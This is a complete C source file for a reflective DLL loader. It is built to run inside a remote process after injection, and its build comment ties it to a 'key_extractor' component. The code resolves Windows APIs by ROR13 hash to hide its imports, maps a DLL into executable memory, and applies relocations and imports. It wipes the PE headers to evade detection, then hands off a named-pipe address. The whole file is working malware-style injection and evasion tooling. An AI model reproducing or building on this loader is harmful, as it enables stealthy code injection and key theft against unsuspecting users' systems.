// bootstrap.c - Reflective loader for injected DLL
//
// The injector passes the pipe name address (UTF-16) as lpParameter.
// The pipe name is located right after the raw DLL image in the remote
// process. We walk backward from the pipe name to find the MZ header,
// then do a full PE relocation + import resolution.
//
// Compiled with: g++ -shared -O2 -s -w -o dll.dll key_extractor.cpp -xc bootstrap.c -lcrypt32 -lole32 -loleaut32

#include <windows.h>

// API hashes (ROR13)
#define H_KERNEL32       0x6A4ABC5B
#define H_NTDLL          0x3CFA685D
#define H_LOADLIBRARYA   0xEC0E4E8E
#define H_GETPROCADDRESS 0x7C0DFCAA
#define H_VIRTUALALLOC   0x91AFCA54
#define H_VIRTUALPROTECT 0x7946C61B
#define H_NTFLUSH        0x534C0AB8

typedef HMODULE(WINAPI* fn_LoadLibraryA)(LPCSTR);
typedef FARPROC(WINAPI* fn_GetProcAddress)(HMODULE, LPCSTR);
typedef LPVOID(WINAPI* fn_VirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL(WINAPI* fn_VirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef LONG(NTAPI* fn_NtFlushInstructionCache)(HANDLE, PVOID, SIZE_T);
typedef BOOL(WINAPI* fn_DllMain)(HINSTANCE, DWORD, LPVOID);

typedef struct { USHORT Length; USHORT MaxLen; PWSTR Buffer; } USTR;
typedef struct {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitOrderLinks;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    USTR FullDllName;
    USTR BaseDllName;
} LDR_ENTRY;
typedef struct { ULONG Length; BOOLEAN Init; HANDLE SsHandle; LIST_ENTRY InLoadOrderModuleList; LIST_ENTRY InMemoryOrderModuleList; } PEB_LDR;
typedef struct { BYTE Pad[2]; BYTE BeingDebugged; BYTE Pad2[1]; PVOID Pad3[2]; PEB_LDR* Ldr; } PEB;

static DWORD CalcHash(const char* s) {
    DWORD h = 0;
    while (*s) { h = (h >> 13) | (h << 19); h += (unsigned char)*s++; }
    return h;
}

static DWORD CalcHashW(USTR* name) {
    DWORD h = 0;
    BYTE* buf = (BYTE*)name->Buffer;
    USHORT len = name->Length;
    while (len--) {
        h = (h >> 13) | (h << 19);
        BYTE c = *buf++;
        if (c >= 'a' && c <= 'z') c -= 0x20;
        h += c;
    }
    return h;
}

static DWORD SectionProtect(DWORD ch) {
    BOOL exec  = (ch & IMAGE_SCN_MEM_EXECUTE) != 0;
    BOOL read  = (ch & IMAGE_SCN_MEM_READ)    != 0;
    BOOL write = (ch & IMAGE_SCN_MEM_WRITE)   != 0;
    if (exec && write) return PAGE_EXECUTE_READWRITE;
    if (exec && read)  return PAGE_EXECUTE_READ;
    if (exec)          return PAGE_EXECUTE;
    if (write)         return PAGE_READWRITE;
    if (read)          return PAGE_READONLY;
    return PAGE_NOACCESS;
}

// Exported entry point.
// lpParameter = address of the pipe name (UTF-16) in the remote process.
// The pipe name was written right after the raw DLL image by the injector.
__declspec(dllexport) ULONG_PTR WINAPI Bootstrap(LPVOID lpParameter) {
    fn_LoadLibraryA pLoadLibraryA = NULL;
    fn_GetProcAddress pGetProcAddress = NULL;
    fn_VirtualAlloc pVirtualAlloc = NULL;
    fn_VirtualProtect pVirtualProtect = NULL;
    fn_NtFlushInstructionCache pNtFlush = NULL;

    // 1. Walk backward from pipe name to find MZ header of raw DLL image.
    //    The pipe name is a UTF-16 string starting with '\\.\pipe\...'
    //    The DLL image is right before it. Scan back up to 64KB.
    ULONG_PTR base = (ULONG_PTR)lpParameter;
    ULONG_PTR scanMin = (base > 0x10000) ? base - 0x10000 : 0;
    while (base > scanMin) {
        PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
        if (dos->e_magic == IMAGE_DOS_SIGNATURE) {
            PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(base + dos->e_lfanew);
            if (nt->Signature == IMAGE_NT_SIGNATURE) break;
        }
        base--;
    }
    if (base <= scanMin) return 0;

    PIMAGE_DOS_HEADER oldDos = (PIMAGE_DOS_HEADER)base;
    PIMAGE_NT_HEADERS oldNt = (PIMAGE_NT_HEADERS)(base + oldDos->e_lfanew);

    // 2. Get PEB and find kernel32/ntdll
#ifdef _WIN64
    ULONG_PTR peb = __readgsqword(0x60);
#else
    ULONG_PTR peb = __readfsdword(0x30);
#endif
    PEB_LDR* ldr = ((PEB*)peb)->Ldr;
    LIST_ENTRY* head = &ldr->InMemoryOrderModuleList;
    LIST_ENTRY* curr = head->Flink;
    ULONG_PTR k32 = 0, ntdll = 0;
    while (curr != head && (!k32 || !ntdll)) {
        LDR_ENTRY* entry = CONTAINING_RECORD(curr, LDR_ENTRY, InMemoryOrderLinks);
        if (entry->BaseDllName.Length > 0) {
            DWORD h = CalcHashW(&entry->BaseDllName);
            if (h == H_KERNEL32) k32 = (ULONG_PTR)entry->DllBase;
            else if (h == H_NTDLL) ntdll = (ULONG_PTR)entry->DllBase;
        }
        curr = curr->Flink;
    }
    if (!k32 || !ntdll) return 0;

    // 3. Resolve kernel32 exports
    PIMAGE_NT_HEADERS ntHdr = (PIMAGE_NT_HEADERS)(k32 + ((PIMAGE_DOS_HEADER)k32)->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)(k32 + ntHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    DWORD* names = (DWORD*)(k32 + exp->AddressOfNames);
    DWORD* funcs = (DWORD*)(k32 + exp->AddressOfFunctions);
    WORD* ords = (WORD*)(k32 + exp->AddressOfNameOrdinals);
    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        char* name = (char*)(k32 + names[i]);
        DWORD h = CalcHash(name);
        if (h == H_LOADLIBRARYA)   pLoadLibraryA   = (fn_LoadLibraryA)(k32 + funcs[ords[i]]);
        else if (h == H_GETPROCADDRESS) pGetProcAddress = (fn_GetProcAddress)(k32 + funcs[ords[i]]);
        else if (h == H_VIRTUALALLOC)   pVirtualAlloc   = (fn_VirtualAlloc)(k32 + funcs[ords[i]]);
        else if (h == H_VIRTUALPROTECT) pVirtualProtect = (fn_VirtualProtect)(k32 + funcs[ords[i]]);
    }
    if (!pLoadLibraryA || !pGetProcAddress || !pVirtualAlloc || !pVirtualProtect) return 0;

    // 4. Resolve ntdll NtFlushInstructionCache
    ntHdr = (PIMAGE_NT_HEADERS)(ntdll + ((PIMAGE_DOS_HEADER)ntdll)->e_lfanew);
    exp = (PIMAGE_EXPORT_DIRECTORY)(ntdll + ntHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    names = (DWORD*)(ntdll + exp->AddressOfNames);
    funcs = (DWORD*)(ntdll + exp->AddressOfFunctions);
    ords = (WORD*)(ntdll + exp->AddressOfNameOrdinals);
    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        if (CalcHash((char*)(ntdll + names[i])) == H_NTFLUSH) {
            pNtFlush = (fn_NtFlushInstructionCache)(ntdll + funcs[ords[i]]);
            break;
        }
    }
    if (!pNtFlush) return 0;

    DWORD epRva = oldNt->OptionalHeader.AddressOfEntryPoint;
    DWORD hdrSize = oldNt->OptionalHeader.SizeOfHeaders;

    // 5. Allocate new memory as RWX
    ULONG_PTR newBase = (ULONG_PTR)pVirtualAlloc(NULL, oldNt->OptionalHeader.SizeOfImage,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!newBase) return 0;

    // 6. Copy headers
    {
        BYTE* s = (BYTE*)base;
        BYTE* d = (BYTE*)newBase;
        for (DWORD i = 0; i < hdrSize; i++) d[i] = s[i];
    }

    // 7. Copy sections
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(oldNt);
    for (WORD i = 0; i < oldNt->FileHeader.NumberOfSections; i++) {
        if (sec[i].SizeOfRawData > 0) {
            BYTE* s = (BYTE*)(base + sec[i].PointerToRawData);
            BYTE* d = (BYTE*)(newBase + sec[i].VirtualAddress);
            for (DWORD j = 0; j < sec[i].SizeOfRawData; j++) d[j] = s[j];
        }
    }

    // 8. Process relocations
    ULONG_PTR delta = newBase - oldNt->OptionalHeader.ImageBase;
    if (delta && oldNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size) {
        PIMAGE_BASE_RELOCATION reloc = (PIMAGE_BASE_RELOCATION)(newBase +
            oldNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
        while (reloc->VirtualAddress) {
            DWORD count = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
            WORD* entry = (WORD*)((BYTE*)reloc + sizeof(IMAGE_BASE_RELOCATION));
            for (DWORD k = 0; k < count; k++) {
                WORD type = entry[k] >> 12;
                WORD offset = entry[k] & 0xFFF;
#ifdef _WIN64
                if (type == IMAGE_REL_BASED_DIR64)
                    *(ULONG_PTR*)(newBase + reloc->VirtualAddress + offset) += delta;
#else
                if (type == IMAGE_REL_BASED_HIGHLOW)
                    *(DWORD*)(newBase + reloc->VirtualAddress + offset) += (DWORD)delta;
#endif
            }
            reloc = (PIMAGE_BASE_RELOCATION)((BYTE*)reloc + reloc->SizeOfBlock);
        }
    }

    // 9. Resolve imports
    if (oldNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size) {
        PIMAGE_IMPORT_DESCRIPTOR imp = (PIMAGE_IMPORT_DESCRIPTOR)(newBase +
            oldNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
        while (imp->Name) {
            HMODULE hMod = pLoadLibraryA((char*)(newBase + imp->Name));
            if (hMod) {
                ULONG_PTR* origThunk = imp->OriginalFirstThunk ?
                    (ULONG_PTR*)(newBase + imp->OriginalFirstThunk) :
                    (ULONG_PTR*)(newBase + imp->FirstThunk);
                ULONG_PTR* thunk = (ULONG_PTR*)(newBase + imp->FirstThunk);
                while (*origThunk) {
                    if (IMAGE_SNAP_BY_ORDINAL(*origThunk)) {
                        *thunk = (ULONG_PTR)pGetProcAddress(hMod, (LPCSTR)IMAGE_ORDINAL(*origThunk));
                    } else {
                        PIMAGE_IMPORT_BY_NAME ibn = (PIMAGE_IMPORT_BY_NAME)(newBase + *origThunk);
                        *thunk = (ULONG_PTR)pGetProcAddress(hMod, ibn->Name);
                    }
                    origThunk++;
                    thunk++;
                }
            }
            imp++;
        }
    }

    // 10. Apply per-section memory protections
    {
        PIMAGE_NT_HEADERS newNt = (PIMAGE_NT_HEADERS)(newBase + ((PIMAGE_DOS_HEADER)newBase)->e_lfanew);
        PIMAGE_SECTION_HEADER newSec = IMAGE_FIRST_SECTION(newNt);
        for (WORD i = 0; i < newNt->FileHeader.NumberOfSections; i++) {
            DWORD prot = SectionProtect(newSec[i].Characteristics);
            DWORD sz = newSec[i].Misc.VirtualSize;
            if (sz == 0) sz = newSec[i].SizeOfRawData;
            if (sz > 0) {
                DWORD old;
                pVirtualProtect((LPVOID)(newBase + newSec[i].VirtualAddress), sz, prot, &old);
            }
        }
    }

    // 11. Flush instruction cache
    pNtFlush((HANDLE)-1, NULL, 0);

    // 12. Wipe PE headers from new allocation
    {
        DWORD old;
        pVirtualProtect((LPVOID)newBase, hdrSize, PAGE_READWRITE, &old);
        volatile BYTE* p = (volatile BYTE*)newBase;
        for (DWORD i = 0; i < hdrSize; i++) p[i] = 0;
        pVirtualProtect((LPVOID)newBase, hdrSize, PAGE_READONLY, &old);
    }

    // 13. Call DllMain with the pipe name address
    if (epRva) {
        fn_DllMain pEntry = (fn_DllMain)(newBase + epRva);
        pEntry((HINSTANCE)newBase, DLL_PROCESS_ATTACH, lpParameter);
    }

    return newBase;
}
